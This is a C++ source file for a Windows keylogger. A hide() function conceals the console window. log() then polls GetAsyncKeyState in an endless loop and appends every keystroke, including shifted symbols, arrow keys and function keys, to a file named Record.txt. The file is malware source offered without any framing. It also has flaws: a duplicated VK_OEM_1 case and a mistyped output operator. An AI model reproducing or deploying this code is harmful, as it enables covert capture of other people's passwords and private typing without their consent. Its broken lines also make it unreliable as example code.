#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <fstream>

using namespace std;

void log();
void hide();

int main()
{
    hide();
    log();

    return 0;
}

void log()
{
     char i;
    for (;;)
    {
        for (i=8;i<=222;i++)
        {
            if (GetAsyncKeyState(i) == -32767)
            {

            ofstream write ("Record.txt",ios::app);

            if (((i>64)&&(i<91))&& !(GetAsyncKeyState(0x10)))
            {
                i+=32;
                write <<i;
                write.close();
                break;
            }

            else if ((i>64)&&(i<91))
            {
                write <<i;
                write.close();
                break;
            }

            else
            {
                switch(i)
                {
                    case 48:
                    {
                      if (GetAsyncKeyState(0x10))
                        write <<")";
                      else
                        write <<"0";
                    }
                    break;

                case 49:
                    {
                      if (GetAsyncKeyState(0x10))
                        write <<"!";
                      else
                        write <<"1";
                    }
                    break;

                    case 50:
                    {
                      if (GetAsyncKeyState(0x10))
                        write <<"@";
                      else
                        write <<"2";
                    }
                    break;

                    case 51:
                    {
                      if (GetAsyncKeyState(0x10))
                        write <<"#";
                      else
                        write <<"3";
                    }
                    break;

                    case 52:
                    {
                      if (GetAsyncKeyState(0x10))
                        write <<"$";
                      else
                        write <<"4";
                    }
                    break;

                    case 53:
                    {
                      if (GetAsyncKeyState(0x10))
                        write <<"%";
                      else
                        write <<"5";
                    }
                    break;

                    case 54:
                    {
                      if (GetAsyncKeyState(0x10))
                        write <<"^";
                      else
                        write <<"6";
                    }
                    break;

                    case 55:
                    {
                      if (GetAsyncKeyState(0x10))
                        write <<"&";
                      else
                        write <<"7";
                    }
                    break;

                    case 56:
                    {
                      if (GetAsyncKeyState(0x10))
                        write <<"*";
                      else
                        write <<"8";
                    }
                    break;

                    case 57:
                    {
                      if (GetAsyncKeyState(0x10))
                        write <<"(";
                      else
                        write <<"9";
                    }
                    break;

                    case VK_SPACE:
                        write <<" ";
                    break;
                    case VK_RETURN:
                        write<<"\n";
                    break;
                    case VK_TAB:
                        write <<"   ";
                        break;
                    case VK_BACK:
                    write <<"<Backspace>";
                    break;
                    case VK_ESCAPE:
                        write <<"<ESC>";
                        break;
                      case VK_DELETE:
                      write <<"<DEL>";
                      break;
                      case VK_RCONTROL:
                        write <<"<RCTRL>";
                        break;
                      case VK_LCONTROL:
                        write <<"<LCTRL>";
                        break;
                      case VK_RMENU:
                        write <<"<RALT>";
                        break;
                      case VK_LMENU:
                        write <<"<LALT>";
                        break;
                      case VK_UP:
                        write <<"<UP>";
                        break;
                      case VK_DOWN:
                        write <<"<Down>";
                        break;
                      case VK_RIGHT:
                        write <<"<Right>";
                        break;
                      case VK_LEFT:
                        write <<"<Left>";
                        break;
                      case VK_NUMPAD0:
                        write <<"0";
                        break;
                      case VK_NUMPAD1:
                        write <<"1";
                        break;
                      case VK_NUMPAD2:
                        write <<"2";
                        break;
                      case VK_NUMPAD3:
                        write <<"3";
                        break;
                      case VK_NUMPAD4:
                        write <<"4";
                        break;
                      case VK_NUMPAD5:
                        write <<"5";
                        break;
                      case VK_NUMPAD6:
                        write <<"6";
                        break;
                      case VK_NUMPAD7:
                        write <<"7";
                        break;
                      case VK_NUMPAD8:
                        write <<"8";
                        break;
                      case VK_NUMPAD9:
                        write <<"9";
                        break;
                      case VK_MULTIPLY:
                        write <<"<*>";
                        break;
                      case VK_ADD:
                        write <<"<+>";
                        break;
                      case VK_SUBTRACT:
                        write <"<->";
                        break;
                      case VK_DIVIDE:
                        write <<"</>";
                        break;
                      case VK_LSHIFT:
                        write <<"<LSHIFT>";
                        break;
                      case VK_RSHIFT:
                        write <<"<RSHIFT>";
                        break;
                      case VK_OEM_1:
                        write <<";";
                        break;
                      case VK_OEM_3:
                        write <<"~";
                        break;
                      case VK_F1:
                        write <<"F1";
                        break;
                        case VK_F2:
                        write <<"F2";
                        break;
                        case VK_F3:
                        write <<"F3";
                        break;
                        case VK_F4:
                        write <<"F4";
                        break;
                        case VK_F5:
                        write <<"F5";
                        break;
                        case VK_F6:
                        write <<"F6";
                        break;
                        case VK_F7:
                        write <<"F7";
                        break;
                        case VK_F8:
                        write <<"F8";
                        break;
                        case VK_F9:
                        write <<"F9";
                        break;
                        case VK_F10:
                        write <<"F10";
                        break;
                        case VK_F11:
                        write <<"F11";
                        break;
                        case VK_F12:
                        write <<"F12";
                        break;
                        case VK_OEM_1:
                            write <<";";
                            break;


                }

            }


            }
        }
    }
}

void hide()
{
    HWND stealth;
    AllocConsole();
    stealth=FindWindowA("ConsoleWindowClass",NULL);
    ShowWindow(stealth,0);

}
